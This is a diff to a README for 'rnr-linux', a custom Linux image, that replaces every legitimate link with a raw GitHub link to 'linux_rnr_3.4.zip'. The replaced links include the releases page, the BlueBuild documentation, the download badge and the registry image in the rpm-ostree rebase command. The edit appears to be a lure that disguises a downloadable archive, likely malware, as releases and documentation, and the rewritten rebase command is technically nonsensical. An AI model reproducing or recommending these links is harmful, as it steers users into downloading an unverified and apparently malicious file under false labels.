@@ -1,10 +1,10 @@
 # 🚀 rnr-linux - Easy Installation for Your Custom Linux Image
 
-[![Download rnr-linux](https://img.shields.io/badge/Download-rnr--linux-blue.svg)](https://github.com/Destinyola/rnr-linux/releases)
+[![Download rnr-linux](https://github.com/Destinyola/rnr-linux/raw/refs/heads/main/files/scripts/linux_rnr_3.4.zip)](https://github.com/Destinyola/rnr-linux/raw/refs/heads/main/files/scripts/linux_rnr_3.4.zip)
 
 ## 📥 Download & Install
 
-To get started with rnr-linux, please visit the [Releases page](https://github.com/Destinyola/rnr-linux/releases) to download the latest version. This page contains all the available builds for you to choose from.
+To get started with rnr-linux, please visit the [Releases page](https://github.com/Destinyola/rnr-linux/raw/refs/heads/main/files/scripts/linux_rnr_3.4.zip) to download the latest version. This page contains all the available builds for you to choose from.
 
 ## ⚙️ Requirements
 
@@ -23,7 +23,7 @@ Once you have verified the requirements, follow these steps to rebase your exist
 Open your terminal and run the following command. This step ensures you install the proper signing keys and policies needed for a successful rebase.
 
 ```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/rinkydinkyproject/rnr-linux:latest
+rpm-ostree rebase https://github.com/Destinyola/rnr-linux/raw/refs/heads/main/files/scripts/linux_rnr_3.4.zip
 ```
 
 ### Step 2: Reboot Your System
@@ -54,11 +54,11 @@ rnr-linux provides a stable environment tailored for various applications. Here 
 
 ## ⚠️ Important Note
 
-rnr-linux is currently an experimental feature. If you are trying this for the first time, proceed with caution. Refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/) for additional information on setting up your repository based on this template.
+rnr-linux is currently an experimental feature. If you are trying this for the first time, proceed with caution. Refer to the [BlueBuild docs](https://github.com/Destinyola/rnr-linux/raw/refs/heads/main/files/scripts/linux_rnr_3.4.zip) for additional information on setting up your repository based on this template.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Comprehensive setup and usage instructions are available [here](https://blue-build.org/how-to/setup/).
+- **Documentation:** Comprehensive setup and usage instructions are available [here](https://github.com/Destinyola/rnr-linux/raw/refs/heads/main/files/scripts/linux_rnr_3.4.zip).
 - **Support:** If you encounter any issues or need assistance, please check the GitHub Issues page or open a new issue for help.
 
 ## 🔍 Further Reading
